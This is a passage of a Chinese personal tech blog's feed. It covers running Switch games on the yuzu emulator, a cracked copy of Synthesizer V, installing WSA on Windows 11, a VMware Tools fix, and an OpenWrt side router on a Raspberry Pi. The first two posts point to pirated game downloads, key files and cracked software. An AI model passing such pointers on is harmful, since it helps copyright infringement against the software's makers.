class="anchor" href="#下载游戏">#</a> 下载游戏</h1><blockquote><p>我发现<a href="https://xxxxx520.com/" title="Switch520"> Switch520</a> 这里的游戏下载没那么多门槛要会员什么什么的，不过都是百度网盘，建议整一个百度网盘会员.(现在有插件可以实现免会员高速下载，有空我再写写：P)</p></blockquote><p>文中提到的文件可以到这个链接：<strong><a href="https://maxshiro-my.sharepoint.com/:f:/g/personal/maxshiroi_maxshiro_onmicrosoft_com/El4X0CVz-TBKqO0k_-_BWRcBt4uT7Tf-gVJtrKdPhbyP5A?e=IUlqdf" title="Sharepoint">Sharepoint</a></strong> 里面下载获取。</p><p>下载 xxx.xci 文件，这就是游戏本体了。将这个游戏本体放到任意文件夹内 (不要有中文) . 双击 yuzu 模拟器中间，选择你放 xci 文件的那个文件夹打开，然后你就会发现游戏已经加载出来了。双击打开爽玩吧～</p><h1 id="处理-switch-游戏文件"><a class="anchor" href="#处理-switch-游戏文件">#</a> 处理 Switch 游戏文件</h1><p>switch 可以下载到的文件有很多种，因此有些时候我们下载得到的文件并不是 xci 或者 nsp 这样的可执行文件。这种时候就需要自己转换游戏文件格式。</p><h2 id="常见的几种格式"><a class="anchor" href="#常见的几种格式">#</a> 常见的几种格式</h2><ul><li><code>xci</code> ：可以理解 XCI 文件直接从卡带提取的文件，而 XCI 整合版（整合了游戏升级补丁 + DLC 的版本是最方便的 推荐下载）</li><li><code>xcz</code> : 是 xci 压缩后的文件，需要转换为 xci 才可以正常使用。</li><li><code>nsp</code> : nsp 相当于正版系统数字游戏，nsp 没有整合版，当您看到文件名称有  <code>000</code>  或者  <code>v0</code>  说明是本体。而文件名中带有  <code>Updata</code>  的则为升级补丁，带有  <code>DLC</code>  字样则为扩展游戏内容的额外内容。</li><li><code>nsz</code> : 有些 DLC 或者升级补丁会打包为 nsz 文件，打包的时候可以忽略，如果是游戏文件则您需要转换为 nsp 文件才可以运行。</li></ul><h2 id="四种格式之间转换"><a class="anchor" href="#四种格式之间转换">#</a> 四种格式之间转换。</h2><blockquote><p>使用 NSCB 软件进行打包等操作，我获取到的适配 15.0.0 版本的。这软件有时效性，因此如果不能正常使用则需要更新。<br><a href="https://wwb.lanzoum.com/iVl9f0dw6svg">NSCB</a></p></blockquote><h1 id="emusak-ui-软件"><a class="anchor" href="#emusak-ui-软件">#</a> EmuSAK UI 软件</h1><blockquote><p>使用此软件可以更方便的管理你电脑上现有的模拟器以及游戏，还可以获取最新的 prod.key 等文件。<br><a href="https://github.com/CapitaineJSparrow/emusak-ui">https://github.com/CapitaineJSparrow/emusak-ui</a></p></blockquote><p>EmuSAK UI 功能一览：</p><ul><li>添加并管理电脑上的多个 switch 模拟器 (单机或者联机版 ryujinx)</li><li>找到并列出电脑中的 switch 游戏</li><li>展示本地着色器缓存 &amp; emusak 在线着色器缓存 (如果本地缓存较少可以下载在线缓存)</li><li>更新固件</li><li>更新 prod keys 密钥</li><li>给下载游戏存档</li><li>下载着色器缓存</li><li>下载 mod 模组</li><li>一键分享电脑中的着色器缓存 (shader cache)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> switch </tag>
            
            <tag> animal crossing </tag>
            
            <tag> Project Diva </tag>
            
            <tag> Miku </tag>
            
            <tag> Mega39 </tag>
            
            <tag> emulater </tag>
            
            <tag> yuzu </tag>
            
            <tag> ryujinx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【虚拟Vocal】 Synthesize V 初代整合</title>
      <link href="/ug/210724/"/>
      <url>/ug/210724/</url>
      
        <content type="html"><![CDATA[<h1 id="软件介绍"><a class="anchor" href="#软件介绍">#</a> 软件介绍</h1><p>Synthesizer V 是 Dreamtonics 开发的系列歌声合成软件，它结合了强大的歌声合成引擎和直观灵活的用户界面，只需绘制旋律并注入歌词，即可轻松创作原创歌曲。</p><h1 id="intro"><a class="anchor" href="#intro">#</a> Intro</h1><p>当你想要摆脱 Vocaloid 软件的支配，想要试试其他同类型的软件。您肯定会搜到这个软件。但是很不幸，当您点开官网查看售价，显然单个声库加 pro 版软件 899 的价格让您打了退堂鼓。<br>  您只好把思路转向搜索 crack 版本软件。又很不幸，这个软件 crack 版的本体和声库都很难寻找。<br>  在这里恭喜您找到了这篇文章。可万幸中的不幸就是，我也没有这个软件的 V2 破解版。但是我找到了 V1 的破解版，在此提供给大家。</p><h1 id="关于软件"><a class="anchor" href="#关于软件">#</a> 关于软件</h1><p>软件的获取来源是 GitHUB 用户 <code>CJLU</code>  的 <code>Synthesizer-V-FE</code> , 版本为 1.8.0，所有功能正常使用。链接地址：<a href="https://github.com/CJLU-source/Synthesizer-V-FE" title="给特何不">给特何不</a></p><h1 id="关于声库"><a class="anchor" href="#关于声库">#</a> 关于声库</h1><p>目前手头上只有这几个声库：</p><h2 id="eng-英语"><a class="anchor" href="#eng-英语">#</a> Eng (英语)</h2><ul><li>爱莲娜芙缇 (女)</li></ul><h2 id="zh-中文"><a class="anchor" href="#zh-中文">#</a> Zh (中文)</h2><ul><li>苍穹 (女)</li><li>赤羽 (女)</li><li>海伊 (女)</li><li>诗岸 (女)</li></ul><h2 id="jp-日文"><a class="anchor" href="#jp-日文">#</a> JP (日文)</h2><ul><li>闇音レンリ (女)</li><li>玄武 (男)</li></ul><h1 id="下载地址-包含全部内容"><a class="anchor" href="#下载地址-包含全部内容">#</a> 下载地址 （包含全部内容）</h1><blockquote><p>特殊原因暂不提供 😦<br>(其实是文件丢了</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vocal </tag>
            
            <tag> AI </tag>
            
            <tag> 歌声合成 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win11 安装 WSA 简易教程</title>
      <link href="/ug/205944/"/>
      <url>/ug/205944/</url>
      
        <content type="html"><![CDATA[<blockquote><p>微软终于在昨天上线了 WSA 的测试版本，此次只有美国地区上线了。因此如果你的 Win11 系统为美区的话，可以直接点击 <a href="https://www.microsoft.com/store/productId/9P3395VX91NR" title="这个链接">这个链接</a> 进行安装。如果非美区那就接着看步骤吧</p></blockquote><blockquote><p>bug 还是有很多，首先是 WSA 无法调用 GPU, 这就导致很多 3d 游戏会很卡，实测明日方舟帧数不到 20 帧。然后安装 WSA 要启用 Hyper-V 即微软的虚拟机平台，打开这个会导致无法再安装和使用其他安卓模拟器。和市面上大多数安卓模拟器相比，微软这个 WSA 是 ARM 翻译运行的，安卓版本更高 (Android 11), 可以运行 ARM 程序。与系统集成度更好 (虽然目前还没有实现 WSL 那样的文件访问) 而模拟器大多都为 Android x86 项目改的，因此最高只能到 Android 9.</p></blockquote><blockquote><p>如果你是想尝尝鲜，试试这个新功能那我还是推荐试一试。如果你主要想拿来打游戏，日常使用的话那还是更推荐安卓模拟器一些.</p></blockquote><h1 id="开启虚拟化"><a class="anchor" href="#开启虚拟化">#</a> 开启虚拟化</h1><blockquote><p>PS: 如果之前你有禁用过 Hyper-V 的话记得使用管理员权限打开 Powershell 然后通过这个指令这个指令重新打开，不记得有没有那就跳过:</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></tbody></table></figure><ol><li>打开开始菜单，直接搜索控制面板，然后打开.</li><li>找到  <code>程序和功能</code>  - <code>启用或关闭 Windows 功能</code>  并点击打开，会弹出一个窗口.</li><li>在弹出窗口里面勾选  <code>Hyper-V</code> 、 <code>Windows 虚拟机监控程序平台</code> 、 <code>适用于 Linux 的 Windows 子系统</code> 、 <code>虚拟机平台</code>  这几项，然后点击确定。系统会自动查找更新并安装.</li><li>等待重启过后就可以进行下一步了.</li></ol><h1 id="安装本体"><a class="anchor" href="#安装本体">#</a> 安装本体</h1><ol><li>首先复制上面那个链接.</li><li><a href="https://store.rg-adguard.net/" title="安装包抓包">安装包抓包</a>，点开这个网址，将第一步复制的链接粘贴到搜索框，右边选择  <code>slow</code>  然后点对勾.</li><li>找到最下面名为  <code>MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle</code>  的一项，注意大小为  <code>1.21GB</code>  , 直接点击进行一个下载.</li><li>找到你下载的文件，然后右键  <code>开始按钮</code>  选择  <code>Windows 终端 (管理员)</code></li><li>然后会打开 Powershell 窗口，在里面输入指令</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add-appxpackage <span class="string">"你下载文件的完整路径"</span> </span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">add-appxpackage <span class="string">"D:\download\MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle"</span></span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>等他跑完以后就会在开始菜单里出现  <code>Windows Subsystem for Android™</code>  点击打开是下面这个界面就说明安装成功了.</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="/img/wsa/20220920220234.png" fancybox="true"></div></div>  <h1 id="安装apk"><a class="anchor" href="#安装apk">#</a> 安装 apk</h1><ol><li>点击文件后面的按钮会自动启动 WSA, 等打开后下面的 ip 地址会刷新。此时我们将开发人员模式打开.</li><li>安装 ADB, 下载 <a href="https://nas.axro.top/index.php/s/frYxCHg7FfabNEY" title="这个文件">这个文件</a> 然后解压到任意目录，然后打开解压出来的文件夹，名称为  <code>platform-tools</code> .</li><li>按住 <code>Shift</code>  键右击文件夹的空白处，选择 <code>显示更多选项</code>  - <code>在此处打开 Powershell 窗口(s)</code> , 然后在打开的窗口内依次输入以下指令:</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:58526 <span class="comment">#这个 127.0.0.1:58526 为你的开发人员选项那一栏里显示的地址.</span></span><br><span class="line"><span class="comment"># 第一次可能会失败, 再输入一次就可以了.</span></span><br><span class="line">adb install -r xxx.apk</span><br><span class="line"><span class="comment"># 这个指令为安装 apk, 将 xxx 替换为你要安装的 apk 文件名称.</span></span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>显示安装完成就会出现在你的开始菜单里，然后直接点击进行一个打开.</li></ol><h1 id="qa"><a class="anchor" href="#qa">#</a> Q&amp;A</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Hyper-V </tag>
            
            <tag> WSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VMware】解决新版本的VMware虚拟机无法正常在旧版本的Windows上安装VMware Tools</title>
      <link href="/ug/124600/"/>
      <url>/ug/124600/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a class="anchor" href="#引言">#</a> 引言</h1><p>因为学习需要，要求安装 <code>Windows server 2008 R2</code> 。安装时一切正常，但是到了安装 <code>VMware Tools</code>  时，弹出了下列提示：</p><div class="tag-plugin image"><div class="image-bg"><img src="/img/vmwarebug/20220920220101.png" fancybox="true"></div></div>  <h1 id="其后"><a class="anchor" href="#其后">#</a> 其后</h1><p>我尝试百度搜索了解决办法，导致这种情况的大概解释为：</p><blockquote><p>原来，微软更新了驱动程序的签名算法，从 2019 年初开始，逐步弃用 SHA-1，改为 SHA-2。个人推测新版的 VMCI 驱动用的是 SHA-2 签名，而 <code>win7</code>  不支持 SHA-2 签名，所以出现了这个问题。</p></blockquote><p>那么怎么办呢？</p><blockquote><p>可以从 <code>Microsoft Update Catalog</code>  下载 <code>KB4474419</code>  和  <code>KB4490628</code>  这两个补丁，然后安装到 <code>win7</code>  虚拟机中。在没有成功安装 <code>VMware Tools</code>  的情况下，传文件不太方便，可以用虚拟机里浏览器访问下载页面，然后直接在虚拟机里下载安装。</p></blockquote><p>可是在 <code>winserver</code>  虚拟机里很难进行操作更别说老旧的 IE 操作更不方便，而且 <code>windows server</code>  的网络管理大家也都知道，会拦截所有地址。所以直到最后我也没法访问到微软的补丁界面。</p><h1 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h1><p>我直接搜索了 <code>VMware Tools</code> ，到其官网上找到了旧版本的 <code>Tools</code>  镜像文件，随后直接对其进行一个挂载，这时直接弹出了自动运行窗口，进行一顿下一步下一步之后，成功将其安装到了虚拟机内。</p><h1 id="旧版本下载地址"><a class="anchor" href="#旧版本下载地址">#</a> 旧版本下载地址</h1><p><a href="https://packages.vmware.com/tools/releases/10.3.5/windows/" title="点我去官网下载">点我去官网下载</a><br>打开以后下载大小为 <code>114M</code>  的映像文件，然后手动挂载到虚拟机上，便会自动运行。</p><p>转载需注明出处！</p>]]></content>
      
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用树莓派4B+Docker Openwrt实现旁路由</title>
      <link href="/ug/205645/"/>
      <url>/ug/205645/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1><blockquote><p>普通路由器往往受限于硬体性能而缺乏很多功能。但是其拥有多网口和无线功能的支持相对较强。为了能实现更多实用功能并且利用上已经吃灰了很久的树莓派，打算用树莓派来当作旁路由.</p></blockquote><h1 id="硬体"><a class="anchor" href="#硬体">#</a> 硬体</h1><h2 id="路由"><a class="anchor" href="#路由">#</a> 路由</h2><ul><li>我使用的是小米路由 3G (下面称为 <code>R3G</code> ). 当时购买的是小米路由 4 版本，但是其缺乏很多功能。就比如说非常实用的 usb 接口。有了 usb 接口以后就可以愉快刷机了。所以我收到货就直接退货换了 R3G...</li><li>R3G 优点是有一个 usb3.0 的接口，所以可以直接拿它来挂载移动硬盘也是没问题的。还有 256M 的闪存。缺点是只有两个 RJ45LAN 口，一个 RJ45WAN 口足够家用。所以后来我又白嫖了我哥在外地买的一台 TPlink 五口交换机解决了网口不够的问题...</li><li>如果你和我一样拥有 R3G. 我建议刷写不死鸟 breed 搭配<a href="https://opt.cn2qq.com/padavan/" title="hiboyhiboyhiboy"> hiboyhiboyhiboy</a> 的固件，来实现更多功能...</li></ul><h2 id="树莓派"><a class="anchor" href="#树莓派">#</a> 树莓派</h2><ul><li>树莓派 4B 我购买的是 4G 内存版本。采用 5V3A,Type-C 供电接口，你甚至可以用一个充电宝和一根 Type-C 线来给树莓派供电。两个 MicroHDMI 接口支持 4K 视频输出。一个极为先进的 3.5mm 音频接口。四个 Type-A USB 接口，其中分为两个 usb2.0 协议，两个 USB3.0 协议。一个千兆 RJ45 网口。另外机器还自带 wifi 模块，就是别指望这个 wifi 信号有多好了...</li><li>我在购买时还一并购买了一张 32G 闪迪的 SD 卡，以及适用于 4B 的九层亚克力外壳。有一说一，这个外壳属实好看...</li><li>不过如果拿它刷 openwrt 只来当作路由器实在大材小用。所以我采用 OPENFANS 和<a href="http://www.pifan.org.cn/" title="树莓派爱好者基地">树莓派爱好者基地</a>联合编译的<a href="https://github.com/openfans-community-offical/Debian-Pi-Aarch64" title="Debian-Pi-Aarch64"> Debian-Pi-Aarch64</a> 来使用</li></ul><h1 id="软体"><a class="anchor" href="#软体">#</a> 软体</h1><h2 id="准备"><a class="anchor" href="#准备">#</a> 准备</h2><ul><li>从上方给出的链接下载<a href="https://github.com/openfans-community-offical/Debian-Pi-Aarch64" title="Debian-Pi-Aarch64"> Debian-Pi-Aarch64</a>, 我这里使用的是没有图形界面的增强版，即 <code>2021-06-11-OPENFANS-Debian-Buster-Aarch64-ext4-v2021-2.0-U6-Release.img.xz</code></li><li>百度搜索 Rufus, 下载到本地</li></ul><h2 id="安装-debian-pi-aarch64"><a class="anchor" href="#安装-debian-pi-aarch64">#</a> 安装 Debian-Pi-Aarch64</h2><ol><li>将 SD 卡接入读卡器连接电脑。注意提前备份 SD 卡的数据，接下来的操作会清除 SD 卡内的全部数据.</li><li>打开 Rufus 软体，在 <code>设备</code> 一栏内选择你的 SD 卡，在 <code>引导类型选择</code> 栏里面单击后面的 <code>选择</code> 按钮，选择你下载的 xz 文件</li><li>单击下面的 <code>开始</code> 按钮即可开始刷写。大概三四分钟后即可刷写成功。请耐心等待...</li><li>刷写完成后在任务栏上将 SD 卡弹出，即可拔下读卡器。将 SD 卡插入树莓派里面即可.</li><li>将树莓派的 LAN 口与路由器的 LAN 口连接，为树莓派接入电源。此时树莓派会自行重启三次左右，以完成基本配置。此时可以喝杯咖啡等待三分钟左右.</li><li>电脑登入路由器控制页面，查找树莓派的 ip, 我这里查到的是 <code>192.168.0.90</code> , 接下来的教程将以这个地址为准...</li><li>如果您使用的是 Win10 系统，那么可以直接按下 <code>Windows徽标键</code>  + <code>R</code> , 输入 <code>CMD</code>  指令单击回车来打开 <code>CMD</code> , 使用 <code>SSH</code>  的方式连入树莓派。当然你也可以使用其他第三方软件来实现.</li><li>使用 <code>ssh -p 22 pi@192.168.0.90</code>  指令来接入树莓派，如果没有出错的话接下来会弹出提示，输入 <code>yes</code>  并按下回车即可。当你看见 password 时，直接输入默认密码 <code>raspberry</code> , 按下回车即可连入树莓派.</li><li>更新一下就可以正常使用了</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></tbody></table></figure><h2 id="配置-debian-pi-aarch64"><a class="anchor" href="#配置-debian-pi-aarch64">#</a> 配置 Debian-Pi-Aarch64</h2><p><strong>如果自己会配置那么这步可以跳过了</strong></p><blockquote><p>可以参考<a href="https://gitee.com/openfans-community/Debian-Pi-Aarch64#3%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" title="这里">这里</a>来配置</p></blockquote><h3 id="切换账户"><a class="anchor" href="#切换账户">#</a> 切换账户</h3><p><code>su</code>  或者 <code>sudo -i</code></p><h3 id="更改账户的密码"><a class="anchor" href="#更改账户的密码">#</a> 更改账户的密码</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 使用下面指令来更改pi用户的密码</span><br><span class="line">// 重复输入两次即可</span><br><span class="line">sudo passwd pi</span><br><span class="line"></span><br><span class="line">// 使用这个指令来更改root账户的密码</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></tbody></table></figure><h3 id="挂载smb硬盘"><a class="anchor" href="#挂载smb硬盘">#</a> 挂载 smb 硬盘</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">mkdir</span> db</span><br><span class="line">mount -o username=xxx,password=xxx,dir_mode=0777,file_mode=0777 //192.168.0.15/database /db</span><br></pre></td></tr></tbody></table></figure><h2 id="安装-openwrt"><a class="anchor" href="#安装-openwrt">#</a> 安装 Openwrt</h2><blockquote><p>在安装之前首先开启 docker 服务并设置开机自动启动</p></blockquote><ul><li>启用和运行 Docker 服务</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 开机自动启动Docker服务</span><br><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line"></span><br><span class="line">// 启动Docker服务</span><br><span class="line">systemctl start docker.service</span><br><span class="line"></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"></span><br><span class="line">// 停止Docker服务</span><br><span class="line">systemctl stop docker.service</span><br><span class="line"></span><br><span class="line">// 禁止Docker服务开机启动</span><br><span class="line">systemctl <span class="built_in">disable</span> docker.service</span><br></pre></td></tr></tbody></table></figure><ol><li>打开网卡混杂模式</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 promisc on</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>创建网络</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d macvlan --subnet=192.168.0.0/24 --gateway=192.168.0.1 -o parent=eth0 macnet </span><br></pre></td></tr></tbody></table></figure><blockquote><p>使用 <code>sudo ifconfig</code>  命令查看树莓派 <code>eth0</code>  网卡的参数来更改<br> <code>--subnet</code>  参数改为树莓派所处网段<br> <code>--gateway</code>  参数改为树莓派所处网段的网关</p></blockquote><ul><li>使用 <code>docker network ls</code>  查看创建好的网络</li></ul><ol start="3"><li>拉取 Openwrt 镜像</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest </span><br></pre></td></tr></tbody></table></figure><ul><li>执行 <code>docker images</code>  命令查看现存镜像</li></ul><ol start="4"><li>创建并启动容器</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always --name openwrt -d --network macnet --privileged registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest /sbin/init </span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>--restart always</code>  参数表示容器退出时始终重启，使服务尽量保持始终可用；<br> <code>--name openwrt</code>  参数定义了容器的名称；<br> <code>-d</code>  参数定义使容器运行在 <code>Daemon</code>  模式；<br> <code>--network macnet</code>  参数定义将容器加入 <code>maxnet</code>  网络；<br> <code>--privileged</code>  参数定义容器运行在特权模式下；<br> <code>registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest</code>  为 Docker 镜像名，因容器托管在阿里云 Docker 镜像仓库内，所以在镜像名中含有阿里云仓库信息；<br> <code>/sbin/init</code>  定义容器启动后执行的命令。</p></blockquote><ul><li>可以使用 <code>docker ps -a</code>  命令查看当前运行的容器</li></ul><blockquote><p>若容器运行信息 <code>STATUS</code>  列为 <code>UP</code>  状态，则说明容器运行正常。</p></blockquote><ol start="5"><li>进入容器并修改相关参数</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it openwrt bash</span><br></pre></td></tr></tbody></table></figure><ul><li>编辑 <code>OpenWrt</code>  的网络配置文件：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/config/network</span><br></pre></td></tr></tbody></table></figure><ul><li>更改 LAN 口设置</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">config interface <span class="string">'lan'</span></span><br><span class="line">        option <span class="built_in">type</span> <span class="string">'bridge'</span></span><br><span class="line">        option ifname <span class="string">'eth0'</span></span><br><span class="line">        option proto <span class="string">'static'</span></span><br><span class="line">        option ipaddr <span class="string">'192.168.0.2'</span></span><br><span class="line">        option netmask <span class="string">'255.255.255.0'</span></span><br><span class="line">        option ip6assign <span class="string">'60'</span></span><br><span class="line">        option gateway <span class="string">'192.168.0.1'</span></span><br><span class="line">        option broadcast <span class="string">'192.168.0.255'</span></span><br><span class="line">        option dns <span class="string">'192.168.0.1'</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>option ipaddr</code>  为 OpenWrt 的 IP 地址，可以根据自己喜好修改，我这里定义为了 <code>192.168.0.2</code></p></blockquote><ul><li>重启网络</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>进入控制面板</li></ol><blockquote><p>打开电脑的浏览器，使用自己定义的地址进入。我这里是 <code>192.168.0.2</code> <br> 用户名: <code>root</code> <br> 密码: <code>password</code></p></blockquote><ol start="7"><li>关闭 DHCP 服务</li></ol><blockquote><p>在 "网络 - 接口 - Lan - 修改" 界面中，勾选下方的 "忽略此接口 (不在此接口提供 DHCP 服务)", 并 "保存 &amp; 应用".</p></blockquote><h2 id="修复宿主机网络"><a class="anchor" href="#修复宿主机网络">#</a> 修复宿主机网络</h2><p>OpenWrt 容器运行后，宿主机内可能无法正常连接外部网络，需要修改宿主机的 <code>/etc/network/interfaces</code>  文件以修复：</p><ol><li>备份并编辑文件</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/network/interfaces /etc/network/interfaces.bak <span class="comment"># 备份文件</span></span><br><span class="line">nano /etc/network/interfaces <span class="comment"># 编辑文件</span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>向文件末尾添加</li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line"></span><br><span class="line">auto macvlan</span><br><span class="line">iface macvlan inet static</span><br><span class="line">  address 192.168.0.90</span><br><span class="line">  netmask 255.255.255.0</span><br><span class="line">  gateway 192.168.0.1</span><br><span class="line">  dns-nameservers 192.168.0.1</span><br><span class="line">  pre-up ip <span class="built_in">link</span> add macvlan <span class="built_in">link</span> eth0 <span class="built_in">type</span> macvlan mode bridge</span><br><span class="line">  post-down ip <span class="built_in">link</span> del macvlan <span class="built_in">link</span> eth0 <span class="built_in">type</span> macvlan mode bridge</span><br></pre></td></tr></tbody></table></figure><ul><li>修改后重启树莓派，之后树莓派的局域网 IP 地址将会固定为 <code>/etc/network/interfaces</code>  文件中 <code>address</code>  参数中的地址.</li></ul><h1 id="鸣谢摘抄"><a class="anchor" href="#鸣谢摘抄">#</a> 鸣谢 (摘抄)</h1><p><a href="https://mlapp.cn/376.html" title="在Docker 中运行 OpenWrt 旁路网关">在 Docker 中运行 OpenWrt 旁路网关</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> 树莓派 </tag>
            
            <tag> openwrt </tag>
            
            <tag> router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Hexo 程序部署博客到githubpage上</title>
      <link href="/ug/133537/"/>
      <url>/ug/133537/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a class="anchor" href="#环境">#</a> 环境</h1><p>Hexo 程序使用 node.js 程序编写，因此需要现在环境机上部署 node.js，git 只用来推送。</p><blockquote><p><strong>什么是 Node.js</strong>：一个运行 javascript (JS) 的环境。Hexo 是一个 javascript (JS) 语言的程序。一般 JS 运行在浏览器中，但是也有一种非浏览器环境也可以运行 JS。这个环境是 Node.js</p></blockquote><blockquote><p><strong>什么是 Git</strong>：一个版本控制软件。Hexo 博客源码由纯文本构成，管理纯文本项目的最好办法之一就是使用 Git。还记得 word 里面的历史记录和版本回退功能么？简单的来说，Git 就提供了类似功能，只不过更强大。</p></blockquote><blockquote><p>本文章使用 fedora 系 linux 操作。</p></blockquote><h2 id="安装-git"><a class="anchor" href="#安装-git">#</a> 安装 git</h2><p>使用 yum 指令进行安装：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">yum install git-core <span class="comment"># 坏习惯，请减少使用root用户</span></span><br></pre></td></tr></tbody></table></figure><p>查看是否安装成功：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># git --version</span></span><br><span class="line">git version 1.8.3.1</span><br></pre></td></tr></tbody></table></figure><h2 id="安装-nodejs"><a class="anchor" href="#安装-nodejs">#</a> 安装 node.js</h2><p>直接 yum 一把梭</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install nodejs</span><br></pre></td></tr></tbody></table></figure><p>然后查看版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># node -v</span></span><br><span class="line">v16.14.2</span><br></pre></td></tr></tbody></table></figure><p>顺便看看 npm 版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># npm -v</span></span><br><span class="line">8.5.0</span><br></pre></td></tr></tbody></table></figure><h1 id="配置本体"><a class="anchor" href="#配置本体">#</a> 配置本体</h1><h2 id="hexo"><a class="anchor" href="#hexo">#</a> hexo</h2><p>如果你没有使用加速等工具的话，这里建议将 npm 源改到淘宝：</p><figure class="highlight 